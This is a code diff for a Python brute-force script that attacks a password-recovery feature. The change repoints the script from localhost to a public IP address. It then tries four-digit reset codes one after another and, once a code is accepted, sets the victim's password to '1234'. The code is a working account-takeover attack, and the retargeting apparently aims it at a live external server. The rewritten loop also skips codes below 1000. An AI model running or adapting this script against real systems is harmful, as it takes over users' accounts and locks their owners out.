@@ -1,8 +1,8 @@
 import requests
 import argparse
 
-RECOVERY_ENDPOINT = 'http://localhost:5000/reset_code_check/{username}'
-LOGIN_ENDPOINT = 'http://localhost:5000/login'
+RECOVERY_ENDPOINT = 'http://91.191.173.36:5000/api/password_recovery'
+LOGIN_ENDPOINT = 'http://91.191.173.36:5000/login'
 PASSWORD_LIST = 'passwords.txt'
 
 
@@ -14,14 +14,21 @@ def try_reset_code(username, code):
 
 
 def brute_recovery(username):
-    # Try all possible combinations of four-digit numbers
-    for code in range(10000):
-        if len(str(code)) == 4:
-            print('Trying code: {}'.format(code))
-            if try_reset_code(username, str(code).zfill(4)):
-                print(f'Found correct code for {username}: {code}')
-                return
-    print(f'Could not find correct code for {username}')
+    # Try all possible combinations of the reset code
+    for i in range(1000, 10000):
+        print('Trying code: {}'.format(i))
+        # Set the reset code
+        code = str(i).zfill(4)
+        # Send a POST request to the API with the username, reset code, and new password
+        data = {'username': username, 'reset-code': code, 'new-password': '1234'}
+        response = requests.post(RECOVERY_ENDPOINT, json=data).json()
+        # Check if the password was successfully changed
+        if response['result'] == 'Success! Changed password.':
+            print(f'Found the correct reset code: {code}')
+            print('Changed password to 1234')
+            break
+        else:
+            print(f'Incorrect reset code: {code}')
 
 
 def try_login(username, password):
